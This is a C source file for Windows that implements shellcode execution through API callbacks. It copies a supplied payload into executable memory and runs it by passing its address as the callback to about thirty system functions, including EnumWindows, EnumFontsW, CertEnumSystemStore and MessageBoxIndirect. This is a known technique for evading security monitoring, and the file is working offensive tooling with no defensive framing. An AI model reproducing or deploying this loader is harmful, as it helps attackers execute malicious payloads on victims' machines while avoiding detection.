#include "Win32Helper.h"

DWORD ShellcodeExecutionDispatchHandler(LPVOID Param)
{
	PSHELLCODE_EXECUTION_INFORMATION Sei = (PSHELLCODE_EXECUTION_INFORMATION)Param;
	LPVOID BinAddress = NULL;
	BOOL bFlag = FALSE;
	HMODULE hModule = NULL;

	BinAddress = VirtualAlloc(NULL, Sei->dwLengthOfPayloadInBytes, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (BinAddress == NULL)
		goto EXIT_ROUTINE;

	CopyMemoryEx(BinAddress, Sei->Payload, Sei->dwLengthOfPayloadInBytes);

	switch (Sei->MethodEnum)
	{
		case E_CDEFFOLDERMENU_CREATE2:
		{
			CDEFFOLDERMENU_CREATE2 CDefFolderMenu_Create2 = NULL;
			PVOID ContextMenuRequired = NULL;

			hModule = TryLoadDllMultiMethodW((PWCHAR)L"Shell32.dll");
			if (!hModule)
				goto EXIT_ROUTINE;

			CDefFolderMenu_Create2 = (CDEFFOLDERMENU_CREATE2)GetProcAddressA((DWORD64)hModule, "CDefFolderMenu_Create2");
			if (!CDefFolderMenu_Create2)
				goto EXIT_ROUTINE;

			if (!SUCCEEDED(CDefFolderMenu_Create2(NULL, NULL, 0, NULL, NULL, BinAddress, 0, NULL, &ContextMenuRequired)))
				goto EXIT_ROUTINE;

			break;
		}

		case E_CERTENUMSYSTEMSTORE:
		{
			CERTENUMSYSTEMSTORE CertEnumSystemStore = NULL;

			hModule = TryLoadDllMultiMethodW((PWCHAR)L"Crypt32.dll");
			if (!hModule)
				goto EXIT_ROUTINE;

			CertEnumSystemStore = (CERTENUMSYSTEMSTORE)GetProcAddressA((DWORD64)hModule, "CertEnumSystemStore");
			if (!CertEnumSystemStore)
				goto EXIT_ROUTINE;

			if (!CertEnumSystemStore(CERT_SYSTEM_STORE_CURRENT_USER, NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE)BinAddress))
				goto EXIT_ROUTINE;

			break;
		}
		
		case E_CERTENUMSYSTEMSTORELOCATION:
		{
			CERTENUMSYSTEMSTORELOCATION CertEnumSystemStoreLocation = NULL;

			hModule = TryLoadDllMultiMethodW((PWCHAR)L"Crypt32.dll");
			if (!hModule)
				goto EXIT_ROUTINE;

			CertEnumSystemStoreLocation = (CERTENUMSYSTEMSTORELOCATION)GetProcAddressA((DWORD64)hModule, "CertEnumSystemStoreLocation");
			if (!CertEnumSystemStoreLocation)
				goto EXIT_ROUTINE;

			if (CertEnumSystemStoreLocation(NULL, NULL, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)BinAddress))
				goto EXIT_ROUTINE;

			break;
		}

		case E_CERTFINDCHAININSTORE:
		{
			goto EXIT_ROUTINE;
		}

		case E_ENUMCHILDWINDOWS:
		{
			if (!EnumChildWindows(NULL, (WNDENUMPROC)BinAddress, NULL))
				goto EXIT_ROUTINE;

			break;
		}

		case E_ENUMDATEFORMATSW:
		{
			if (!EnumDateFormatsW((DATEFMT_ENUMPROCW)BinAddress, LOCALE_SYSTEM_DEFAULT, 0))
				goto EXIT_ROUTINE;

			break;
		}

		case E_ENUMDESKTOPWINDOWS:
		{
			if (!EnumDesktopWindows(GetThreadDesktop(GetCurrentThreadId()), (WNDENUMPROC)BinAddress, NULL))
				goto EXIT_ROUTINE;

			break;
		}

		case E_ENUMDESKTOPSW:
		{
			if (!EnumDesktopsW(GetProcessWindowStation(), (DESKTOPENUMPROCW)BinAddress, NULL))
				goto EXIT_ROUTINE;

			break;
		}

		case E_ENUMDIRTREEW:
		{
			SYMINITIALIZEW SymInitialize = NULL;
			SYMCLEANUP SymCleanup = NULL;
			ENUMDIRTREEW EnumDirTree = NULL;
			WCHAR DisposeableBuffer[512] = { 0 };

			hModule = TryLoadDllMultiMethodW((PWCHAR)L"dbghelp.dll");
			if (hModule == NULL)
				goto EXIT_ROUTINE;

			SymInitialize = (SYMINITIALIZEW)GetProcAddressA((DWORD64)hModule, "SymInitializeW");
			SymCleanup = (SYMCLEANUP)GetProcAddressA((DWORD64)hModule, "SymCleanup");
			EnumDirTree = (ENUMDIRTREEW)GetProcAddressA((DWORD64)hModule, "EnumDirTreeW");

			if (!SymInitialize || !SymCleanup || !EnumDirTree)
				goto EXIT_ROUTINE;

			if (!SymInitialize(InlineGetCurrentProcess, NULL, TRUE))
				goto EXIT_ROUTINE;

			EnumDirTree(InlineGetCurrentProcess, L"C:\\Windows", L"*.log", DisposeableBuffer, BinAddress, NULL);

			SymCleanup(InlineGetCurrentProcess);

			break;
		}

		case E_ENUMDISPLAYMONITORS:
		{
			if (!EnumDisplayMonitors(NULL, NULL, (MONITORENUMPROC)BinAddress, NULL))
				goto EXIT_ROUTINE;

			break;
		}

		case E_ENUMFONTFAMILIESEXW:
		{
			LOGFONTW Font = { 0 };
			Font.lfCharSet = DEFAULT_CHARSET;

			if (!EnumFontFamiliesExW(GetDC(NULL), &Font, (FONTENUMPROCW)BinAddress, NULL, NULL))
				goto EXIT_ROUTINE;

			break;
		}

		case E_ENUMFONTSW:
		{
			EnumFontsW(GetDC(NULL), NULL, (FONTENUMPROCW)BinAddress, NULL);
			break;
		}

		case E_ENUMICMPROFILESW:
		{
			goto EXIT_ROUTINE;
		}

		case E_ENUMLANGUAGEGROUPLOCALESW:
		{
			EnumLanguageGroupLocalesW((LANGGROUPLOCALE_ENUMPROCW)BinAddress, LGRPID_ARABIC, 0, 0);
			break;
		}

		case E_ENUMOBJECTS:
		{
			LOGFONTW Font = { 0 };
			Font.lfCharSet = DEFAULT_CHARSET;

			EnumObjects(GetDC(NULL), OBJ_BRUSH, (GOBJENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMPROPSEXW:
		{
			goto EXIT_ROUTINE;
		}

		case E_ENUMRESOURCETYPESEXW:
		{
			EnumResourceTypesExW(NULL, (ENUMRESTYPEPROCW)BinAddress, NULL, RESOURCE_ENUM_VALIDATE, NULL);
			break;
		}

		case E_ENUMSYSTEMCODEPAGES:
		{
			EnumSystemCodePagesW((CODEPAGE_ENUMPROCW)BinAddress, CP_INSTALLED);
			break;
		}

		case E_ENUMSYSTEMGEOID:
		{
			EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)BinAddress);
			break;
		}

		case E_ENUMSYSTEMLANGUAGEGROUPS:
		{
			EnumSystemLanguageGroupsW((LANGUAGEGROUP_ENUMPROCW)BinAddress, LGRPID_SUPPORTED, NULL);
			break;
		}

		case E_ENUMSYSTEMLOCALESEX:
		{
			EnumSystemLocalesEx((LOCALE_ENUMPROCEX)BinAddress, LOCALE_ALL, NULL, NULL);
			break;
		}

		case E_ENUMTHREADWINDOWS:
		{
			EnumThreadWindows(0, (WNDENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMTIMEFORMATSEX:
		{
			EnumTimeFormatsEx((TIMEFMT_ENUMPROCEX)BinAddress, LOCALE_NAME_SYSTEM_DEFAULT, TIME_NOSECONDS, NULL);
			break;
		}

		case E_ENUMUILANGUAGESW:
		{
			EnumUILanguagesW((UILANGUAGE_ENUMPROCW)BinAddress, MUI_LANGUAGE_ID, NULL);
			break;
		}

		case E_ENUMWINDOWSTATIONSW:
		{
			EnumWindowStationsW((WINSTAENUMPROCW)BinAddress, NULL);
			break;
		}

		case E_ENUMWINDOWS:
		{
			EnumWindows((WNDENUMPROC)BinAddress, NULL);
			break;
		}

		case E_ENUMPROPSW:
		{
			goto EXIT_ROUTINE;
		}

		case E_MESSAGEBOXINDIRECT:
		{
			MSGBOXPARAMS MessageBoxParams = { 0 };
			MessageBoxParams.cbSize = sizeof(MSGBOXPARAMS);
			MessageBoxParams.dwStyle = MB_HELP;
			MessageBoxParams.lpfnMsgBoxCallback = (MSGBOXCALLBACK)BinAddress;
			MessageBoxParams.lpszText = L"[Unstable] Help Executes Shellcode";

			MessageBoxIndirect(&MessageBoxParams);
		}

		default:
			goto EXIT_ROUTINE;

	}

	bFlag = TRUE;

EXIT_ROUTINE:

	if (hModule)
		FreeLibrary(hModule);

	if (BinAddress)
		VirtualFree(BinAddress, 0, MEM_RELEASE);

	return (bFlag ? 0 : 0xffffffff);
}

BOOL ShellcodeExecutionViaFunctionCallbackMain(_In_ PSHELLCODE_EXECUTION_INFORMATION Sei)
{
	return CreateThreadAndWaitForCompletion(ShellcodeExecutionDispatchHandler, Sei, INFINITE);
}